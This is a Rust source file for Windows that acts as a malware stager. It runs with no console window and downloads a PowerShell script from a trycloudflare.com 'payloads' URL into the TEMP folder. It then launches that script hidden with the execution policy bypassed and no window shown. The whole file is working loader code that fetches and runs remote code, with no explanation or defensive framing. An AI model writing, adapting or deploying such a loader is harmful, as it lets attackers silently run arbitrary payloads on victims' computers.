#![windows_subsystem = "windows"]
use std::ptr;

#[link(name = "kernel32")]
extern "system" {
    fn CreateProcessA(app: *const u8, cmd: *mut u8, pa: *mut u8, ta: *mut u8, 
                      inh: i32, fl: u32, env: *mut u8, dir: *const u8,
                      si: *mut [u8; 104], pi: *mut [u8; 24]) -> i32;
    fn GetEnvironmentVariableA(n: *const u8, b: *mut u8, s: u32) -> u32;
    fn Sleep(ms: u32);
}

#[link(name = "wininet")]
extern "system" {
    fn InternetOpenA(a: *const u8, t: u32, px: *const u8, pb: *const u8, f: u32) -> *mut u8;
    fn InternetOpenUrlA(h: *mut u8, u: *const u8, hd: *const u8, hdl: u32, f: u32, ctx: usize) -> *mut u8;
    fn InternetReadFile(h: *mut u8, b: *mut u8, s: u32, r: *mut u32) -> i32;
    fn InternetCloseHandle(h: *mut u8) -> i32;
}

const URL: &[u8] = b"https://doc-seven-signs-carbon.trycloudflare.com/payloads/i5_syscall.ps1\0";

fn main() {
    unsafe {
        Sleep(2000);
        
        // Download PS1 content
        let h = InternetOpenA(b"M\0".as_ptr(), 0, ptr::null(), ptr::null(), 0);
        if h.is_null() { return; }
        let c = InternetOpenUrlA(h, URL.as_ptr(), ptr::null(), 0, 0x80000100, 0);
        if c.is_null() { InternetCloseHandle(h); return; }
        
        let mut buf = vec![0u8; 16 * 1024];
        let mut total = 0usize;
        loop {
            let mut rd = 0u32;
            if InternetReadFile(c, buf.as_mut_ptr().add(total), (buf.len() - total) as u32, &mut rd) == 0 { break; }
            if rd == 0 { break; }
            total += rd as usize;
        }
        InternetCloseHandle(c);
        InternetCloseHandle(h);
        if total == 0 { return; }
        
        // Get %TEMP%
        let mut tmp = [0u8; 260];
        GetEnvironmentVariableA(b"TEMP\0".as_ptr(), tmp.as_mut_ptr(), 260);
        let tmp_str = std::ffi::CStr::from_ptr(tmp.as_ptr() as *const i8).to_str().unwrap_or("C:\\Windows\\Temp");
        
        // Write to temp file with random name
        let fname = format!("{}\\{}.ps1\0", tmp_str, std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs() % 100000);
        std::fs::write(fname.trim_end_matches('\0'), &buf[..total]).ok();
        
        // Execute via cmd /c with bypass
        let mut cmd = format!(
            "cmd /c start /min powershell -w h -ep bypass -f \"{}\"\0",
            fname.trim_end_matches('\0')
        ).into_bytes();
        
        let mut si = [0u8; 104];
        si[0] = 104;
        let mut pi = [0u8; 24];
        
        CreateProcessA(
            ptr::null(), cmd.as_mut_ptr(),
            ptr::null_mut(), ptr::null_mut(),
            0, 0x08000000,
            ptr::null_mut(), ptr::null(),
            &mut si, &mut pi
        );
    }
}
